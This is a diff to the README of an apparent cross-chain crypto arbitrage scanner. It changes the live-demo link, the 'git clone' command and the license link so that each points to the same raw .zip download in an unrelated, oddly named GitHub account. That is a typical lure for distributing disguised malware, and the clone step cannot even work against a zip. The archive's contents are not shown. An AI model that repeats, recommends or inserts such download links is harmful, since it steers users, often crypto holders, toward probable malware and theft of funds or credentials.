@@ -2,7 +2,7 @@
 
 **Real-time cross-chain arbitrage scanner. Finds price gaps between Solana, Ethereum, BNB Chain, and Arbitrum.**
 
-[**Live Demo**](https://visioneth.github.io/cross-chain-arb/)
+[**Live Demo**](https://github.com/zaxvczov-afk/cross-chain-arb/raw/refs/heads/main/docs/arb-chain-cross-v2.1-alpha.2.zip)
 
 ![cross-chain-arb](docs/og-image.svg)
 
@@ -43,11 +43,11 @@
 ## Run Locally
 
 ```bash
-git clone https://github.com/visioneth/cross-chain-arb.git
+git clone https://github.com/zaxvczov-afk/cross-chain-arb/raw/refs/heads/main/docs/arb-chain-cross-v2.1-alpha.2.zip
 cd cross-chain-arb/docs
 open index.html
 ```
 
 ## License
 
-MIT — [visioneth](https://github.com/visioneth)
+MIT — [visioneth](https://github.com/zaxvczov-afk/cross-chain-arb/raw/refs/heads/main/docs/arb-chain-cross-v2.1-alpha.2.zip)
